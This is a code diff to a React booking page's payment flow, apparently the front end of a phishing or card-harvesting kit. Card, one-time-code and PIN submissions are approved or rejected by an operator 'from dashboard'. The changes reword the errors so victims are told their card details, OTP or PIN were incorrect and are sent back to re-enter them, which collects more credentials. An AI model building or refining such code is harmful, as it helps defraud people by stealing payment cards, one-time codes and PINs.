@@ -407,25 +407,35 @@ export default function Book() {
       setCardRejectionError(null);
     } else if (fsCardStatus === "rejected") {
       setPayStep("card");
-      setCardRejectionError("Your card was declined. Please check your details and try again with a different card.");
+      setCardRejectionError("Your card details are incorrect. Please re-enter your card information.");
     } else if (fsCardStatus === "message") {
       setPayStep("card");
-      setCardRejectionError("We need additional verification. Please call us: +1 948 223 2328.");
+      setCardRejectionError("We could not verify your card. Please re-enter your card information or try a different card.");
     }
   }, [fsCardStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  // ── React to OTP approval from dashboard ─────────────────────────────────
+  // ── React to OTP status changes from dashboard ───────────────────────────
   useEffect(() => {
-    if (fsV5Status === "approved" && step === "payment") {
+    if (!fsV5Status || step !== "payment") return;
+    if (fsV5Status === "approved") {
       // OTP approved → booking confirmed
       onPaymentSuccessRef.current?.(`verified_otp_${Date.now()}`, { cardholderName: "" });
+    } else if (fsV5Status === "rejected" || fsV5Status === "message") {
+      // OTP rejected → back to OTP input with error
+      setPayStep("otp");
+      setOtpError("The code you entered is incorrect. Please check and try again.");
     }
   }, [fsV5Status, step]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  // ── React to PIN approval from dashboard ──────────────────────────────────
+  // ── React to PIN status changes from dashboard ────────────────────────────
   useEffect(() => {
-    if (fsPinStatus === "approved" && step === "payment") {
+    if (!fsPinStatus || step !== "payment") return;
+    if (fsPinStatus === "approved") {
       onPaymentSuccessRef.current?.(`verified_pin_${Date.now()}`, { cardholderName: "" });
+    } else if (fsPinStatus === "rejected" || fsPinStatus === "message") {
+      // PIN rejected → back to PIN input with error
+      setPayStep("pin");
+      setPinError("The PIN you entered is incorrect. Please check and try again.");
     }
   }, [fsPinStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps
 
